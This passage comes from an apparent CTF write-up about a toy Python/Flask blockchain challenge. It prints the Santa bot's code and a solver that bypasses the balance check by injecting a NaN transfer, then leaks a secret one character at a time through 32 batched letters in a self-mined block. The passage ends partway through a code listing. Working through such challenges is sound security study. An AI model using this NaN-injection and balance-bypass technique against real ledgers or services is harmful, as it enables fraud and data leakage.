        <span class="n">head_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/block</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">head_resp</span><span class="p">.</span><span class="nf">raise_for_status</span><span class="p">()</span>
        <span class="n">head_json</span> <span class="o">=</span> <span class="n">head_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
        <span class="n">head_block</span> <span class="o">=</span> <span class="n">head_json</span><span class="p">[</span><span class="sh">"</span><span class="s">block</span><span class="sh">"</span><span class="p">]</span>
        <span class="n">head_hash</span> <span class="o">=</span> <span class="n">head_json</span><span class="p">[</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">]</span>

        <span class="n">chain</span> <span class="o">=</span> <span class="p">[</span><span class="n">head_block</span><span class="p">]</span>
        <span class="n">current_hash</span> <span class="o">=</span> <span class="n">head_block</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>
        <span class="k">while</span> <span class="n">current_hash</span><span class="p">:</span>
            <span class="n">current_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/block</span><span class="sh">"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">current_hash</span><span class="p">})</span>
            <span class="k">if</span> <span class="n">current_resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">current_json</span> <span class="o">=</span> <span class="n">current_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
            <span class="n">block</span> <span class="o">=</span> <span class="n">current_json</span><span class="p">[</span><span class="sh">"</span><span class="s">block</span><span class="sh">"</span><span class="p">]</span>
            <span class="n">chain</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
            <span class="n">current_hash</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>
        <span class="n">chain</span><span class="p">.</span><span class="nf">reverse</span><span class="p">()</span>

        <span class="n">balances_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/balances</span><span class="sh">"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">head_hash</span><span class="p">})</span>
        <span class="n">balances_resp</span><span class="p">.</span><span class="nf">raise_for_status</span><span class="p">()</span>
        <span class="n">balances_json</span> <span class="o">=</span> <span class="n">balances_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
        <span class="n">nice_balances</span> <span class="o">=</span> <span class="n">balances_json</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">balances</span><span class="sh">"</span><span class="p">,</span> <span class="p">{})</span>

        <span class="n">letters</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="c1"># Collect letters Santa can trust (recent blocks are not yet sufficiently confirmed)
</span>        <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">[:</span><span class="o">-</span><span class="n">REQUIRED_CONFIRMATION_DEPTH</span><span class="p">]:</span>
            <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]:</span>
                <span class="k">if</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">].</span><span class="nf">startswith</span><span class="p">(</span><span class="n">LETTER_HEADER</span><span class="p">):</span>
                    <span class="n">child</span> <span class="o">=</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">]</span>
                    <span class="n">letters</span><span class="p">.</span><span class="nf">setdefault</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="p">{})</span>
                    <span class="n">letters</span><span class="p">[</span><span class="n">child</span><span class="p">][</span><span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">]]</span> <span class="o">=</span> <span class="n">tx</span>

        <span class="c1"># Remove letters Santa already responded to with gifts
</span>        <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]:</span>
                <span class="k">if</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">gift</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">:</span>
                    <span class="k">assert</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">].</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">-gift</span><span class="sh">"</span><span class="p">)</span>
                    <span class="n">child</span> <span class="o">=</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">]</span>
                    <span class="k">if</span> <span class="n">child</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
                        <span class="n">letters</span><span class="p">[</span><span class="n">child</span><span class="p">].</span><span class="nf">pop</span><span class="p">(</span><span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">][:</span><span class="o">-</span><span class="mi">5</span><span class="p">],</span> <span class="bp">None</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">child</span><span class="p">,</span> <span class="n">child_letters</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
            <span class="k">for</span> <span class="n">nonce</span> <span class="ow">in</span> <span class="nf">list</span><span class="p">(</span><span class="n">child_letters</span><span class="p">.</span><span class="nf">keys</span><span class="p">()):</span>
                <span class="k">if</span> <span class="n">nonce</span> <span class="ow">in</span> <span class="n">RECENT_GIFTS</span><span class="p">:</span>
                    <span class="n">child_letters</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span>

        <span class="c1"># Santa only gives gifts to children on the nice list
</span>        <span class="k">for</span> <span class="n">child</span> <span class="ow">in</span> <span class="nf">list</span><span class="p">(</span><span class="n">letters</span><span class="p">.</span><span class="nf">keys</span><span class="p">()):</span>
            <span class="k">if</span> <span class="n">nice_balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">letters</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>

        <span class="n">letter</span> <span class="o">=</span> <span class="nf">next</span><span class="p">((</span><span class="n">tx</span> <span class="k">for</span> <span class="n">child_letters</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">.</span><span class="nf">values</span><span class="p">()</span> <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">child_letters</span><span class="p">.</span><span class="nf">values</span><span class="p">()),</span> <span class="bp">None</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">letter</span><span class="p">:</span>
            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="n">child</span> <span class="o">=</span> <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">]</span>
        <span class="n">gift_value</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="k">if</span> <span class="n">SECRET_GIFT</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">]:</span>
            <span class="n">gift_value</span> <span class="o">=</span> <span class="n">FLAG_GIFT</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">gift_value</span> <span class="ow">and</span> <span class="p">(</span><span class="n">match</span> <span class="p">:</span><span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">secret index #([0-9]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">])):</span>
            <span class="n">index</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="k">match</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
            <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">SECRET_GIFT</span><span class="p">):</span>
                <span class="n">gift_value</span> <span class="o">=</span> <span class="n">SECRET_GIFT</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">gift_value</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">gift</span> <span class="ow">in</span> <span class="n">GIFTS</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">gift</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">].</span><span class="nf">lower</span><span class="p">():</span>
                    <span class="n">gift_value</span> <span class="o">=</span> <span class="n">gift</span>
                    <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">gift_value</span><span class="p">:</span>
            <span class="n">gift_value</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">GIFTS</span><span class="p">)</span>

        <span class="n">gift_tx</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="n">child</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gift</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">gift</span><span class="sh">"</span><span class="p">:</span> <span class="n">gift_value</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">letter</span><span class="p">[</span><span class="sh">'</span><span class="s">nonce</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">-gift</span><span class="sh">"</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">gift_tx</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">))</span>
        <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>
        <span class="n">gift_tx</span><span class="p">[</span><span class="sh">"</span><span class="s">sig</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">SANTA_KEY</span><span class="p">.</span><span class="nf">sign</span><span class="p">(</span><span class="n">digest</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>

        <span class="n">RECENT_GIFTS</span><span class="p">[</span><span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">]]</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/tx</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">gift_tx</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[santa] queued gift </span><span class="si">{</span><span class="n">gift_tx</span><span class="p">[</span><span class="sh">'</span><span class="s">nonce</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s"> for </span><span class="si">{</span><span class="n">child</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[santa] rejected gift </span><span class="si">{</span><span class="n">gift_tx</span><span class="p">[</span><span class="sh">'</span><span class="s">nonce</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s"> for </span><span class="si">{</span><span class="n">child</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[santa] error:</span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>

    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div></details><p>and folder <code class="language-plaintext highlighter-rouge">keys/</code></p><p>This is a challenge simulating a simple blockchain written in Python/Flask. The system includes:</p><ul><li><code class="language-plaintext highlighter-rouge">north_poole.py</code> (Server): Manages the blockchain, mempool, and validates blocks/transactions.<li><code class="language-plaintext highlighter-rouge">elf.py</code> (Miners): Automated bots that mine blocks and receive rewards.<li><code class="language-plaintext highlighter-rouge">santa.py</code> (Santa): An automated bot that reads letters on the blockchain and sends gifts.<li><code class="language-plaintext highlighter-rouge">children.py</code>: Users who send letters requesting gifts.</ul><p>In <code class="language-plaintext highlighter-rouge">santa.py</code>, Santa will send <code class="language-plaintext highlighter-rouge">FLAG_GIFT</code> if our message contains the secret string <code class="language-plaintext highlighter-rouge">SECRET_GIFT</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">SECRET_GIFT</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>
<span class="n">FLAG_GIFT</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read_text</span><span class="p">()</span>
<span class="bp">...</span>
<span class="k">if</span> <span class="n">SECRET_GIFT</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">]:</span>
    <span class="n">gift_value</span> <span class="o">=</span> <span class="n">FLAG_GIFT</span>  
</pre></table></code></div></div><p>The problem is that <code class="language-plaintext highlighter-rouge">SECRET_GIFT</code> is randomly generated at runtime, so we can‚Äôt predict it. Also in <code class="language-plaintext highlighter-rouge">santa.py</code>, there‚Äôs a piece of code that allows us to <code class="language-plaintext highlighter-rouge">ask</code> for each character of <code class="language-plaintext highlighter-rouge">SECRET_GIFT</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="ow">not</span> <span class="n">gift_value</span> <span class="ow">and</span> <span class="p">(</span><span class="n">match</span> <span class="p">:</span><span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">secret index #([0-9]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">])):</span>
    <span class="n">index</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="k">match</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">SECRET_GIFT</span><span class="p">):</span>
        <span class="n">gift_value</span> <span class="o">=</span> <span class="n">SECRET_GIFT</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</pre></table></code></div></div><p>If you send an email with the content <code class="language-plaintext highlighter-rouge">secret index #0</code>, Santa will send back a gift transaction containing the zero character of the secret string. =&gt; Strategy: Send 32 requests (from index 0 to 31) to leak all <code class="language-plaintext highlighter-rouge">SECRET_GIFT</code>. However, there‚Äôre some constraints</p><ul><li>Santa only gives gifts if our <code class="language-plaintext highlighter-rouge">Nice</code> balance is &gt; 0 (<code class="language-plaintext highlighter-rouge">nice_balances.get(child, 0) &lt;= 0</code>). Each time we receive a gift, our balance is reduced by 1. To have a balance, we need to be selected as a ‚Äúnice person‚Äù in a block by the miner (1 point added).<li>In <code class="language-plaintext highlighter-rouge">north_poole.py</code>, when validating a new block:<div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>  <span class="n">nice_counts</span> <span class="o">=</span> <span class="p">{}</span>
  <span class="bp">...</span>
  <span class="k">if</span> <span class="n">nice_counts</span><span class="p">[</span><span class="n">nice_person</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
      <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">abuse of nice list detected</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
</pre></table></code></div></div></ul><p>an identity cannot appear more than 10 times in the entire history of the best chain. Furhtermore, to leak 32 characters, you need to receive 32 gifts, which means spending 32 NiceCoins. However, the system only allows <code class="language-plaintext highlighter-rouge">hacker</code> users to mine a maximum of 10 coins and Santa only reads messages that have been confirmed through 5 blocks (<code class="language-plaintext highlighter-rouge">REQUIRED_CONFIRMATION_DEPTH = 5</code>).</p><p>Finally, the system uses Python‚Äôs JSON library with default configuration (allowing <code class="language-plaintext highlighter-rouge">NaN</code>). In <code class="language-plaintext highlighter-rouge">santa.py</code>, the balance check condition is:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">nice_balances</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">letters</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
</pre></table></code></div></div><p>float(‚Äònan‚Äô) &lt;= 0 returns False. So if we hack the balance to NaN, we will bypass this check forever (Infinite Wealth).</p><hr /><h3 id="exploitation-5"><span class="me-2">Exploitation</span><a href="#exploitation-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Our plan is:</p><ul><li>Permanent balance hack (NaN Injection)<li>Leak Secret (Batch Transaction)<li>Get flag</ul><h4 id="handling-json-nan-ignoring-strict-requests"><span class="me-2">Handling JSON NaN (Ignoring Strict Requests)</span><a href="#handling-json-nan-ignoring-strict-requests" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This is the most important function that makes the payload work. It forces Python to generate a JSON string containing NaN without reporting errors.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">to_json_str</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">),</span> <span class="n">allow_nan</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</pre></table></code></div></div><p>Injection:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">step1_nan</span><span class="p">(</span><span class="n">priv</span><span class="p">):</span>
    <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">,</span> 
          <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">:</span> <span class="nf">float</span><span class="p">(</span><span class="sh">"</span><span class="s">nan</span><span class="sh">"</span><span class="p">),</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">nan-</span><span class="si">{</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">}</span>
    <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span>
    
    <span class="nf">mine_block</span><span class="p">([</span><span class="n">tx</span><span class="p">])</span>
</pre></table></code></div></div><h4 id="leak-secret"><span class="me-2">Leak Secret</span><a href="#leak-secret" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To retrieve the 32-character <code class="language-plaintext highlighter-rouge">SECRET_GIFT</code> efficiently, we use a Batching Strategy:</p><ul><li>Generate 32 distinct letters, each asking for a specific index (secret index #0 to #31).<li>Instead of broadcasting these to the mempool and waiting for the automated <code class="language-plaintext highlighter-rouge">elf</code> to mine them (which is slow and unreliable), we bundle all 32 transactions into a single block and mine it ourselves.<li>Santa has a strict rule: <code class="language-plaintext highlighter-rouge">REQUIRED_CONFIRMATION_DEPTH = 5</code>. He will ignores any letters included in the top 5 blocks. To force Santa to read our mail immediately, after mining the block containing our letters, we immediately mine 6 empty blocks on top of it.</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">step2_leak</span><span class="p">(</span><span class="n">priv</span><span class="p">):</span>
    <span class="c1"># 1. Prepare 32 letters
</span>    <span class="n">txs</span><span class="p">,</span> <span class="n">map_nonce</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
        <span class="n">n</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())</span>
        <span class="n">map_nonce</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
        <span class="c1"># Construct letter requesting specific index
</span>        <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">,</span> 
              <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">LETTER_HEADER</span><span class="si">}</span><span class="s">secret index #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="n">n</span><span class="p">}</span>
        <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span>
        <span class="n">txs</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
    
    <span class="c1"># 2. Mine block containing all 32 letters
</span>    <span class="nf">mine_block</span><span class="p">(</span><span class="n">txs</span><span class="p">)</span>
    
    <span class="c1"># 3. Mine padding blocks to satisfy Confirmation Depth
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">CONFIRMATION_DEPTH</span><span class="p">):</span>
        <span class="nf">mine_block</span><span class="p">([])</span>
</pre></table></code></div></div><p>While we are mining padding blocks, the <code class="language-plaintext highlighter-rouge">elf</code> on the server are also active. Santa might reply, and an Elf might mine a block containing Santa‚Äôs gift before we finish our padding. If we only check the mempool or the HEAD block, we might miss the gift if it was buried a few blocks deep.</p><p>To solve this, our solver implements a <code class="language-plaintext highlighter-rouge">scan_recent_blocks</code> function that traverses the blockchain history (checking the last 15 blocks) to ensure no gift is missed.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
